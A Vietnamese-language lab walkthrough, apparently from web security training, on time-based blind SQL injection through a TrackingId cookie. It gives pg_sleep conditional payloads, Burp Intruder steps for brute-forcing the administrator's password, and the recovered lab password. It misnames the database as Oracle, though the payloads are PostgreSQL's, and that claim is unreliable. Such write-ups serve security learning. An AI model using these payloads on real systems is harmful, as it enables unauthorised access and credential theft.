## Blind SQL injection with time delays and information retrieval

Xác định được CSDL đang sử dụng là Oracle bằng cách sử dụng câu query time deplay của Oracle
> **TrackingId=crL1RtnRvnEhp8aD'||pg_sleep(10)--**

Chúng ta sẽ xác nhận user admin có trong bảng user không bằng cách thử câu điều kiện lỗi.
**SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END**

Áp dụng vào trackingId
> **TrackingId=crL1RtnRvnEhp8aD'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--**

điều kiện đúng thì thực hiện vế 1, không thì thực hiện else => Ta sẽ thấy mất hẳn 5s reponse mới được trả về => đây là đk đúng

Ta truy vấn kiểm tra xem user admin có tồn tại hay không nhờ vào thời gian trả về reponse là từ 5s
> **TrackingId=crL1RtnRvnEhp8aD'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM USERS)--**

![](/imgs/SQL-Injection/61.png?raw=true)

Tiếp tục brute xem pass có độ dài bao nhiêu.

Đưa request sang Intruder và đánh dấu đô la vào phần độ dài pass (Phần payload thì chọn number)

Ở Tab resource pool ta sẽ tạo thêm pool mới max request là 1 để xác định xem request nào đang delay.

![](/imgs/SQL-Injection/62.png?raw=true)

Sau khi brute xong ta check phần response receive đến payload số 19 có sự thay đổi về response receive => password có 20 kí tự

![](/imgs/SQL-Injection/63.png?raw=true)

Sau khi đã biết được có 20 kí tự trong pass ta sẽ brute 1 lần nữa lấy ra nguyên pass như các lab đã làm (có thể chỉnh thời gian deplay còn 2 hoặc 3s để không phải chờ mỏi mòn :v)

Xếp lại theo response receive chúng ta sẽ nhận được các reponse với response receive cao hơn các reponse khác, nếu đếm ra thì có chính xác 20 response như vậy.

![](/imgs/SQL-Injection/64.png?raw=true)

Chúng ta sẽ xếp lại playload1 tương ứng với giá trị của payload2 rồi login vào
Wt1azwyrlmqdo6yemc6j

![](/imgs/SQL-Injection/65.png?raw=true)




